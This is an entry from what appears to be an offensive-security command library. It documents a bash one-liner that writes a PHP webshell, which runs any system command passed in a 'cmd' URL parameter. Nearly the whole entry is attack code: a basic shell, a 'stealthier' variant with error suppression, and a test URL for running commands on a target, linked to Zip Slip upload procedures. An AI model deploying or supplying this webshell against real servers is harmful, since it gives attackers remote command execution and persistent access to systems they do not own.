---
type: command
executor: bash
data: >-
  echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' >
  $_PAYLOAD_FILE
tags:
  - webshell
  - php
  - rce
platforms:
  - Linux
  - Unix
verified: true
validated: true
---

# create-simple-php-webshell

## Command

```bash
echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > $_PAYLOAD_FILE
```

## Description

This command creates a basic PHP webshell file on the attacker's local machine, which can be used as a payload for exploits like Zip Slip. It writes a one-liner PHP script that executes system commands received via the 'cmd' GET parameter, enabling remote command execution when accessed through a web server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PAYLOAD_FILE | Name of the output PHP file (default: shell.php) | Yes |

## Examples

### Basic Usage

```bash
echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > shell.php
```

### Advanced Usage

```bash
echo '<?php error_reporting(0); if(isset($_GET["cmd"])) { echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; } ?>' > advanced_shell.php
```

(Add error suppression and output formatting for stealthier operation.)

## Expected Output

No direct output from the echo command, but verify with:

```bash
cat shell.php
```

Output:
```
<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>
```

The file is created successfully if the cat shows the PHP code. Test post-deployment by accessing http://target/shell.php?cmd=whoami, which should return the server's user ID.

## Related

- [[procedures/Zip-Slip-Exploit-for-PHP-Shell-Upload-on-Unix-Server]]
- [[commands/evilarc-generate-zip-slip-php-shell]]
